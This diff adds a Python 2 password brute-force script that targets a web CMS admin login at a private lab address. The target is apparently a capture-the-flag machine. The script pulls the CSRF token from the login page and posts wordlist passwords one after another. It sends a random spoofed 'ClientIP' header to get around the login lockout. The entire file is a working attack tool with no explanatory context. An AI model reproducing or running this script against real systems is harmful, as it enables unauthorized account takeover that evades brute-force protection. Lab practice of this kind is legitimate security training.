@@ -1,0 +1,58 @@
+#!/usr/bin/python
+#!-*-coding:utf8-*-
+import os
+import requests
+import re
+import random
+#open rockyou.txt +readlines
+#POST REQUEST  with password patload changing
+name=raw_input("Enter Username:")
+wordlist=raw_input("Enter Password list path:")
+
+def ipcreate():
+        global ip
+        w=random.randint(0,254)
+        x=random.randint(0,254)
+        y=random.randint(0,254)
+        z=random.randint(0,254)
+        ip=str(w)+"."+str(x)+"."+str(y)+"."+str(z)
+        return ip
+
+def rockyou():
+        global ip,wordlist
+        print "OPENING ROCKYOU"
+        file=open(wordlist,"r+")
+#       l=os.stat(file).st_size
+        pword=file.readlines()
+        password=[y.strip() for y in pword]
+        ipcreate()
+        login_page="http://10.10.10.191/admin/login"
+        x=0
+        for psswd in password:
+                x=x+1
+                print "PASSWORD TESTED: ",x,"/"+psswd+"/"
+                session=requests.Session()
+                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0","ClientIP":ip}
+                login=session.get("http://10.10.10.191/admin/login",headers=headers)
+                csrf=re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login.text).group(1)
+                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0","ClientIP":ip,"Referer":login_page}
+                payload={"tokenCSRF":csrf,"username":name,"password":psswd,"save":""}
+                print "CSRF:",csrf
+                r=session.post("http://10.10.10.191/admin/",payload,headers=headers,allow_redirects=False)
+                loc=r.headers
+                st=r.status_code
+                print st
+
+                if "location"  in loc :
+                        print "PASSWORD FOUND!!!!>>>>>>>>",psswd
+                        print r.headers
+                        exit()
+
+                if st!=200:
+                        print "[PASSWORD]:",psswd
+                        raw_input("PASSWORD FOUND!!!!(?)Press Enter to Continue bruteforce:")
+
+
+ipcreate()
+rockyou()
+
